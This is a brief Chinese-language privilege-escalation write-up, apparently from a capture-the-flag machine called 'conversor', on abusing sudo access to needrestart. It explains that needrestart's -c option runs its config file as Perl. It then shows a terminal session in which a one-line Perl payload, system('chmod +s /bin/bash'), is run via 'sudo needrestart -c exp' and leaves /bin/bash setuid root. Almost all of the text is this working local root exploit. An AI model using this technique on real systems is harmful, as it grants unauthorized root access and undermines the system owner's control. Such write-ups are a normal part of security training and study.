
needrestart有过几个cve但是要求sudo的`env_reset`不能被启用，也就是不能清除环境变量

更通用的提权时-c参数
```
needrestart --help | grep 'config'
    -c <cfg>    config filename
```
needrestart会把执行的config文件当作perl来执行，所以写入perl恶意文件即可
```
fismathack@conversor:~$ cat exp
system("chmod +s /bin/bash");
fismathack@conversor:~$ ls -al | grep exp
-rwxrwxr-x 1 fismathack fismathack   30 Dec  2 06:38 exp
fismathack@conversor:~$ ls -al | grep exp
-rwxrwxr-x 1 fismathack fismathack   30 Dec  2 06:38 exp
fismathack@conversor:~$ sudo needrestart -c exp
Scanning processes...
Scanning linux images...

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on
 this host.
fismathack@conversor:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash

```
即可
